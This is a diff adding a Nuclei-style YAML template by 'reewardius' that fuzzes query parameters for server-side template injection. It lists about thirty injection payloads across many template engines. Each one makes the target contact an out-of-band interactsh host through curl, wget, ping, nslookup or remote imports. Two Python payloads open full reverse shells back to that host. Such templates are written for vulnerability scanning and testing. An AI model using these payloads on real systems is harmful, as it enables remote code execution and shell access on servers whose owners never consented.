@@ -1,0 +1,65 @@
+id: reflected-ssti-collaborator
+
+info:
+  name: Reflected SSTI Collaborator Based
+  author: reewardius
+  severity: critical
+  reference:
+    - https://www.pwny.cc/web-attacks/server-side-template-injection-ssti
+  tags: fuzzing-rce,fuzzing-ssti,fuzzing-req
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      ssti:
+        - '${request.getAttribute("c").add("ping {{interactsh-url}}")}'
+        - "{{['curl {{interactsh-url}}','']|sort('system')}}"
+        - "{{[0]|reduce('system','curl {{interactsh-url}}')}}"
+        - "%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{{interactsh-url}}',443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('sh')'`"
+        - "${T(java.lang.Runtime).getRuntime().exec('curl {{interactsh-url}}')}"
+        - "${T(java.lang.Runtime).getRuntime().exec('wget {{interactsh-url}}')}"
+        - "${T(java.lang.Runtime).getRuntime().exec('nslookup {{interactsh-url}}')}"
+        - "${T(java.lang.Runtime).getRuntime().exec('ping {{interactsh-url}}')}"
+        - '${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping {{interactsh-url}}\\\")"))}'
+        - '@import (inline) "http://{{interactsh-url}}";'
+        - '<%= `curl {{interactsh-url}}` %>'
+        - "<%= system('curl {{interactsh-url}}') %>"
+        - '<%= `ping {{interactsh-url}}` %>'
+        - "<%= system('ping {{interactsh-url}}') %>"
+        - '<%= `wget {{interactsh-url}}` %>'
+        - "<%= system('wget {{interactsh-url}}') %>"
+        - 'body {color: `global.process.mainModule.require("child_process").execSync("curl {{interactsh-url}}")`;}'
+        - '{php}echo `curl {{interactsh-url}}`;{/php}'
+        - "{system('curl {{interactsh-url}}')}"
+        - 'body {color: `global.process.mainModule.require("child_process").execSync("wget {{interactsh-url}}")`;}'
+        - '{php}echo `wget {{interactsh-url}}`;{/php}'
+        - "{system('wget {{interactsh-url}}')}"
+        - "{{['wget {{interactsh-url}}']|filter('system')}}"
+        - "}}{%+import+os+%}{{os.system('nslookup {{interactsh-url}}')}}"
+        - "{{['curl {{interactsh-url}}']|filter('system')}}"
+        - "{{['nslookup {{interactsh-url}}']|filter('system')}}"
+        - "['nslookup {{interactsh-url}}']"
+        - "[% 'nslookup {{interactsh-url}}' %]"
+        - '<esi:include src="http://{{interactsh-url}}/ping/" />'
+        - "{{constructor.constructor('import('http://{{interactsh-url}}')')()}}"
+        - '[="freemarker.template.utility.Execute"?new()("nslookup http://{{interactsh-url}}")]'
+        - "', exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{{interactsh-url}}',80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'))#"
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{ssti}}"
+
+    stop-at-first-match: true
+    redirects: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"		  
